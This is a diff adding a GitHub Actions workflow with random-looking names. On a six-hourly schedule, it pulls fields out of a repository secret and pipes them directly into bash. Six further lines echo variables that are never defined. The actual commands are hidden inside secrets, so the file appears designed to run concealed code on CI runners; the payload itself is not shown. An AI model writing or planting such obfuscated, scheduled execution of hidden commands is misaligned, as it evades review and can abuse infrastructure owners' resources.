@@ -1,0 +1,24 @@
+name: ganbaoda6547
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ganbaoda6547
+        env:
+          izyx4531: ${{ secrets.izyx4531 }}
+        run: |
+          echo $izyx4531 | jq -r .hg20 | /bin/bash
+          echo $isjg873 | jq -r .eaq7 | /bin/bash
+          echo $xw5 | jq -r .y5 | /bin/bash
+          echo $u489 | jq -r .qxg2 | /bin/bash
+          echo $wuj3161 | jq -r .df9706 | /bin/bash
+          echo $t6 | jq -r .qzozf9 | /bin/bash
+          echo $mylsp5 | jq -r .zsex3 | /bin/bash
+
